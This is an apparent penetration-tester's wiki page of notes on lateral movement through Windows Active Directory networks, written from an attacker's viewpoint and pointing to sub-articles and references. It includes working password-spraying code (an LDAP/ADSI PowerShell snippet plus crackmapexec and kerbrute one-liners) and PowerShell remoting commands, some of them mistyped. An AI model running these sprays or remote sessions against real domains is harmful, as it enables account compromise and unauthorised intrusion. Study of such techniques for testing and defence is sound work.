# Windows Network Lateral Movement

The articles [[Network-Protocols-Hub]], [[Network-Protocols]] and [[Windows-Networking]] will provide theory background information, while [[Windows-Networking-Commands]], [[Windows-Commands]] ,[[SMB-Recon-Cheatsheet]] and [[RPCClient-Cheatsheet]] articles will provide command cheatsheet referal.

The are many ways to navigate the network and move laterally through it, the most stealthier from an attacker perspective is to use live off the land and sue common Administrative Tools or by emulating regular user behaviour, but also Systems Administrator behaviour - why would a local admin connect from machine that has no reason to connect to another.

This article will require some knowledge of **Integrity Tokens** [[Bypassing-Windows-User-Account-Control]] and [[Windows-User-Account-Control]] as the restrictions imposed by this system, some methods may fail due UAC enforcement. Also Domain and Local Administrators are different objects, but Domain Admins with Local Admin privileges will not be subject to the same checks as a Local Admin. For remote restrictions made by UAC documentation see [UAC Remote Restriction Documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) 

## Contents

[[AD-Lateral-Movement-Spawning-Remote-Processes]]
[[AD-Lateral-Movement-Via-WMI]]
[[AD-Lateral-Movement-Alternate-Authentication-Material]]
[[AD-Lateral-Movement-Abusing-User-Behaviour]]
[[AD-Lateral-Movement-With-DCOM]]
#### Port Redirection

Often in real-world networks, Administrator with block some ports for security reasons or have implemented segmentation around the network preventing [[SMB]], [[RDP]], [[WinRM]] or [[RPC] ports. Therefore  [[Port-Redirection-And-Tunnelling]] is used to bypass these restrictions.

#### Exploitation through Hashes and Ticket passing for Lateral Movement

See individual articles:
[[Pass-The-Hash]]
[[Overpass-The-Hash]]
[[Pass-The-Ticket]]

#### Password Attacks on AD Authentication

Password Spraying and Brute forcing is bad m'kay for stealth and time, make sure you are doing other foreground activities
```powershell
# Check Lockout threshold
net accounts
```

LDAP and ADSI password spraying
```powershell
# If the password is invalid, no object will be created and an exception response will be recieved 
$username = ""
$password = ""
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, $username, $password)
```

[[Crackmapexec-Cheatsheet]]
```bash
crackmapexec smb $ipAddress -u users.txt -p 'Password123!' -d $domain.$tld --continue-on-success
```

[[Kerbrute-Cheatsheet]]
```bash
kerbrute passwordspray -d $domain.$tld users.txt "Password123!"
```

#### Windows Utilities and Open-Source Attack/Access Tools 

[[AD-Lateral-Movement-Via-PsExec]]
[[AD-Lateral-Movement-Via-WinRM]]
[[AD-Lateral-Movement-Via-WMI]]

```powershell
$pass = convertto-securestring -asplaintext -force -string ""
$cred = new-object -typename system.management.automation.pscredential -arguementlist "",$pass
$session = newpssession -computername dc01 -credential $cred
enter-pssession -session $sessions
# Sometimes you need to use invoke command instead of $session creation due to shell limitations
invoke-comand -computername $computername -ScriptBlock { whoami /all }  -Credential $cred
# PSRemoting may require a specific configuration as it is a restricting psremoting onto DCs:
-ConfigurationName $configName
```

You can also use [[Impacket-Cheatsheet]]


#### Pass the ccache

[hackingarticles](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)



## References

[Lateral movement and pivoting THM Room](https://tryhackme.com/room/lateralmovementandpivoting)[hackingarticles](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)
[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) 
[Psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
[Metasploit PsExec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
[Alternate PtH methods](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/0)
[Graeber BH Whitepaper](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
[DCOM](https://en.wikipedia.org/wiki/Distributed_Component_Object_Model) 
[COM](https://en.wikipedia.org/wiki/Component_Object_Model)
[MS DCOM Documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN) 
[Enigmaox3](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
[UAC Remote Restriction Documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) 